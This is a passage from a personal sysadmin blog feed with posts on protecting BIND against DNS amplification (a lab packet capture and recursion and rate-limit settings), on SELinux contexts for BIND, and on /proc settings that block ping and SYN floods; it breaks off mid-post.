</span><span class='line'>$ 14:40:59.359333 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [S], seq 1455644106, win 14600, options [mss 1460,sackOK,TS val 83179159 ecr 0,nop,wscale 7], length 0
</span><span class='line'>$ 14:40:59.359389 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.39772: Flags [S.], seq 1716101542, ack 1455644107, win 14480, options [mss 1460,sackOK,TS val 82842604 ecr 83179159,nop,wscale 7], length 0
</span><span class='line'>$ 14:40:59.359656 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [.], ack 1, win 115, options [nop,nop,TS val 83179159 ecr 82842604], length 0
</span><span class='line'>$ 14:40:59.359693 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [P.], seq 1:28, ack 1, win 115, options [nop,nop,TS val 83179159 ecr 82842604], length 2728735+ ANY? isc.org. (25)
</span><span class='line'>$ 14:40:59.359705 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.39772: Flags [.], ack 28, win 114, options [nop,nop,TS val 82842604 ecr 83179159], length 0
</span><span class='line'>$ 14:40:59.360556 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.39772: Flags [.], seq 1:2897, ack 28, win 114, options [nop,nop,TS val 82842605 ecr 83179159], length 289628735 28/4/8 RRSIG, SPF, RRSIG, RRSIG, DNSKEY, DNSKEY, RRSIG, NAPTR, RRSIG, AAAA 2001:4f8:0:2::d, RRSIG, TXT "v=spf1 a mx ip4:204.152.184.0/21 ip4:149.20.0.0/16 ip6:2001:04F8::0/32 ip6:2001:500:60::65/128 ~all", TXT "$Id: isc.org,v 1.1801 2013-05-08 00:18:57 plosher Exp $", RRSIG, MX mx.pao1.isc.org. 10, MX mx.ams1.isc.org. 10, RRSIG, A 149.20.64.42, RRSIG, RRSIG, SOA, RRSIG[|domain]
</span><span class='line'>$ 14:40:59.360593 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.39772: Flags [P.], seq 2897:3315, ack 28, win 114, options [nop,nop,TS val 82842605 ecr 83179159], length 41811977 updateMA*-| [11008q],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,[|domain]
</span><span class='line'>$ 14:40:59.360857 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [.], ack 1449, win 137, options [nop,nop,TS val 83179160 ecr 82842605], length 0
</span><span class='line'>$ 14:40:59.360875 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [.], ack 2897, win 160, options [nop,nop,TS val 83179160 ecr 82842605], length 0
</span><span class='line'>$ 14:40:59.360881 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [.], ack 3315, win 182, options [nop,nop,TS val 83179160 ecr 82842605], length 0
</span><span class='line'>$ 14:40:59.362728 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [F.], seq 28, ack 3315, win 182, options [nop,nop,TS val 83179162 ecr 82842605], length 0
</span><span class='line'>$ 14:40:59.362875 IP master.wondershare.cn.domain &gt; attack.wondershare.cn.39772: Flags [F.], seq 3315, ack 29, win 114, options [nop,nop,TS val 82842608 ecr 83179162], length 0
</span><span class='line'>$ 14:40:59.363453 IP attack.wondershare.cn.39772 &gt; master.wondershare.cn.domain: Flags [.], ack 3316, win 182, options [nop,nop,TS val 83179163 ecr 82842608], length 0</span></code></pre></td></tr></table></div></figure>


<p>That&#8217;s a 64 byte query that resulted in a 3,620 byte response.
And there are UDP and TCP.</p>

<p>You can find this test from <a href="http://blog.cloudflare.com/deep-inside-a-dns-amplification-ddos-attack">Deep Inside a DNS Amplification DDoS Attack</a>.</p>

<h1>My test nameserver is going to make a change</h1>

<h2>Backup my former configure files</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> [root@_master_192.168.10.112  etc]$ pwd
</span><span class='line'> /var/named/chroot/etc
</span><span class='line'> [root@_master_192.168.10.112  etc]$ cp -P named.conf named.conf.20130509
</span><span class='line'> [root@_slave_192.168.10.111  etc]$ cp -P named.conf named.conf.20130509</span></code></pre></td></tr></table></div></figure>


<h2>Change the configuration files</h2>

<h3>Recursiver</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ...
</span><span class='line'> Options {
</span><span class='line'> ...
</span><span class='line'> //  allow-query { any; };
</span><span class='line'> //  allow-recursion { any; };
</span><span class='line'>   recursion no;
</span><span class='line'>   additional-from-cache no;
</span><span class='line'>   allow-query { none; };
</span><span class='line'>   version "None of your business";
</span><span class='line'> ...
</span><span class='line'> }
</span><span class='line'> ...
</span><span class='line'> view "lan192" {
</span><span class='line'>   match-clients { key lan192;zone1; };
</span><span class='line'>   allow-query { zone1; };
</span><span class='line'>   recursion yes;
</span><span class='line'>   additional-from-cache yes;
</span><span class='line'> }
</span><span class='line'> view "lan10" {
</span><span class='line'>   match-clients { key lan10;zone2; };
</span><span class='line'>   allow-query { zone2; };
</span><span class='line'>   recursion yes;
</span><span class='line'>   additional-from-cache yes;
</span><span class='line'> ...
</span><span class='line'> }
</span><span class='line'> ...</span></code></pre></td></tr></table></div></figure>


<h4>Check named.conf file and restart the server.</h4>

<h4>Slave also</h4>

<p>.Did it.</p>

<h3>Response Rate Limiting</h3>

<p>http://www.redbarn.org/dns/ratelimits <a href="http://www.redbarn.org/dns/ratelimits">link1</a><br />
http://ss.vix.su/~vjs/rrlrpz.html <a href="http://ss.vix.su/~vjs/rrlrpz.html">link2</a><br />
I&#8217;m going to do it later&#8230;&#8230;</p>

<h3>References</h3>

<ol>
<li><a href="http://openresolverproject.org/">Open DNS Resolver Project</a><br /></li>
<li><a href="http://dns.measurement-factory.com/cgi-bin/openresolverquery.pl">The Measurement Factory List Open Resolvers on Your Network</a><br /></li>
<li><a href="http://dns.measurement-factory.com/cgi-bin/openresolvercheck.pl">The Measurement Factory Open Resolver Test</a><br /></li>
<li><a href="http://dns.measurement-factory.com/surveys/openresolvers/ASN-reports/latest.html">The Measurement Factory Open Resolvers for Each Autonomous System</a><br /></li>
<li><a href="http://www.dnsinspect.com/">DNSInspect com</a><br /></li>
<li><a href="http://tools.ietf.org/html/rfc1034">RFC 1034 DOMAIN NAMES  CONCEPTS AND FACILITIES</a><br /></li>
<li><a href="http://tools.ietf.org/html/bcp38">BCP 38 Network Ingress Filtering Defeating Denial of Service Attacks which employ IP Source Address Spoofing</a><br /></li>
<li><a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.ch03.html#id2567992">Chapter 3 Name Server Configuration</a><br /></li>
<li><a href="http://technet.microsoft.com/en-us/library/cc787602.aspx">Disable recursion on the DNS server</a><br /></li>
<li><a href="http://ftp.isc.org/isc/bind9/cur/9.9/doc/arm/Bv9ARM.ch07.html#Access_Control_Lists">Chapter 7 BIND 9 Security Considerations</a><br /></li>
<li><a href="http://technet.microsoft.com/en-us/library/cc754941.aspx">Configure a DNS Server to Use Forwarders</a><br /></li>
<li><a href="http://ss.vix.su/~vixie/isc-tn-2012-1.txt">DNS Response Rate Limiting DNS RRL</a><br /></li>
<li><a href="http://www.redbarn.org/dns/ratelimits">Response Rate Limiting in the Domain Name System DNS RRL</a><br /></li>
</ol>


<h2>God bless my servers&#8230;</h2>

<h3>more&#8230;&#8230;</h3>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DNS and SELinux]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux/"/>
    <updated>2013-05-08T16:10:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux</id>
    <content type="html"><![CDATA[<p><img src="http://lin-credible.github.io/images/selinux.jpg" alt="alt text" /><br />
<a href="http://wiki.centos.org/HowTos/SELinux">CentOS Wiki about SELinux</a><br /></p>

<!-- more -->


<h2>My Test Environment</h2>

<p><img src="http://lin-credible.github.io/images/selinux_and_dns.jpg" alt="alt text" /><br /></p>

<figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">srvmpio</span>
</span><span class='line'> <span class="no">Linux</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">32</span><span class="o">-</span><span class="mi">279</span><span class="o">.</span><span class="mi">14</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">el6</span><span class="o">.</span><span class="n">x86_64</span> <span class="c1">#1 SMP Tue Nov 6 23:43:09 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">cat</span> <span class="sr">/etc/issue</span>
</span><span class='line'> <span class="no">CentOS</span> <span class="n">release</span> <span class="mi">6</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Final</span><span class="p">)</span>
</span><span class='line'> <span class="no">Kernel</span> <span class="p">\</span><span class="n">r</span> <span class="n">on</span> <span class="n">an</span> <span class="p">\</span><span class="n">m</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">getenforce</span>
</span><span class='line'> <span class="no">Enforcing</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">named</span> <span class="o">-</span><span class="n">version</span>
</span><span class='line'> <span class="no">BIND</span> <span class="mi">9</span><span class="o">.</span><span class="mi">8</span><span class="o">.</span><span class="mi">2</span><span class="n">rc1</span><span class="o">-</span><span class="no">RedHat</span><span class="o">-</span><span class="mi">9</span><span class="o">.</span><span class="mi">8</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="o">.</span><span class="mi">17</span><span class="o">.</span><span class="n">rc1</span><span class="o">.</span><span class="n">el6_4</span><span class="o">.</span><span class="mi">4</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">dig</span> <span class="n">txt</span> <span class="n">chaos</span> <span class="n">version</span><span class="o">.</span><span class="n">bind</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong><em>Slave 192.168.10.111 is the same configuration.</em></strong>
The test is based on <a href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/?=241520525">my previous done</a></p>

<h2>named_selinux</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 8 named_selinux</span></code></pre></td></tr></table></div></figure>


<h3>File context</h3>

<h4>named_conf_t</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Set files with the named_conf_t type, if you want to treat the files as named configuration data,
</span><span class='line'>usually stored under the /etc directory.
</span><span class='line'>
</span><span class='line'>Paths:
</span><span class='line'>    /var/named/chroot/etc/named.root.hints,     /var/named/chroot(/.*)?,      /var/named/named.ca,
</span><span class='line'>    /etc/unbound(/.*)?,                       /var/named/chroot/etc/named.caching-nameserver.conf,
</span><span class='line'>    /etc/named.root.hints,  /var/named/chroot/etc/named.rfc1912.zones,   /etc/named.rfc1912.zones,
</span><span class='line'>    /etc/named.caching-nameserver.conf,   /etc/named.conf,   /var/named/chroot/var/named/named.ca,
</span><span class='line'>    /var/named/chroot/etc/named.conf, /etc/rndc.*</span></code></pre></td></tr></table></div></figure>


<h4>named_zone_t</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Set files with the named_zone_t type, if you want to treat the files as named zone data.
</span><span class='line'>
</span><span class='line'>Paths:
</span><span class='line'>    /var/named/chroot/var/named(/.*)?, /var/named(/.*)?</span></code></pre></td></tr></table></div></figure>


<p>&#8230;&#8230;</p>

<h3>master</h3>

<figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">Z</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">root</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_conf_t:s0</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">Z</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/*</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_conf_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">named</span><span class="o">.</span><span class="n">ca</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Change the zone file&#8217;s serial number(add) and reload the named.</h4>

<h3>Slave</h3>

<figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_slave_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_slave_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">Z</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----.</span> <span class="n">root</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_conf_t:s0</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@_slave_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">Z</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">slaves</span><span class="o">/</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="o">.</span><span class="n">/wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Now, check the zone file&#8217;s serial number. The slave&#8217;s zone files just changed. It&#8217;s different from the former test.??</h4>

<h3>Look</h3>

<p><img src="http://lin-credible.github.io/images/named_write_master_zones.jpg" alt="alt text" /><br /></p>

<h5>mine here.</h5>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@_master_192.168.10.112  named]$ getsebool -a |grep named
</span><span class='line'>named_write_master_zones --&gt; off
</span><span class='line'>[root@_slave_192.168.10.111  slaves]$ getsebool -a |grep named
</span><span class='line'>named_write_master_zones --&gt; off</span></code></pre></td></tr></table></div></figure>


<h3>I do nothing, but enable the SELinux. And the name service just is still nice!</h3>

<h2>Make a change.</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@_master_192.168.10.112  named]$ getsebool -a |grep named
</span><span class='line'>named_write_master_zones --&gt; off
</span><span class='line'>[root@_master_192.168.10.112  named]$ setsebool -P named_write_master_zones 1
</span><span class='line'>[root@_master_192.168.10.112  named]$ getsebool -a |grep named               
</span><span class='line'>named_write_master_zones --&gt; on</span></code></pre></td></tr></table></div></figure>


<h3>The M/S name servers still run well.</h3>

<h4>Futher more &#8230;&#8230;</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Art of Banning Ping Command and SYN Flood]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/"/>
    <updated>2013-05-07T10:07:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command</id>
    <content type="html"><![CDATA[<h2>1. The theory of ping.</h2>

<p><img src="http://lin-credible.github.io/images/ping.jpg" alt="alt text" /><br /></p>

<h2>2. kernel about</h2>

<h3>help doc</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install -y kernel-doc.noarch
</span></code></pre></td></tr></table></div></figure>




<!-- more -->


<p>kernel-doc.noarch : Various documentation bits found in the kernel source</p>

<h3>/proc/sys/net/ipv4/</h3>

<h4>My test environment</h4>

<p><img src="http://lin-credible.github.io/images/ping_art.jpg" alt="alt text" /><br /></p>

<h4>test prepare</h4>

<p>Show IP Address in prompt</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`hostname -I` \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Show Internet IP Address in prompt</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`curl ifconfig.me` \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>or here, It&#8217;s faster.</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@`curl icanhazip.com` \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure>


<h4>2.1 icmp_echo_ignore_all</h4>

<figure class='code'><figcaption><span>192.168.10.78/default - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://lin-credible.github.io/images/ping/icmp_echo_ignore_all_0.jpg" alt="alt text" /><br /></p>

<figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://lin-credible.github.io/images/ping/icmp_echo_ignore_all_1.jpg" alt="alt text" /><br /></p>

<h4>2.2 icmp_echo_ignore_broadcasts</h4>

<figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span><span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_broadcasts</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>192.168.10.112/ping - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="o">/]</span><span class="vg">$ping</span> <span class="o">-</span><span class="n">b</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">255</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">51</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">128</span> <span class="n">time</span><span class="o">=</span><span class="mi">0</span><span class="o">.</span><span class="mi">565</span> <span class="n">ms</span>
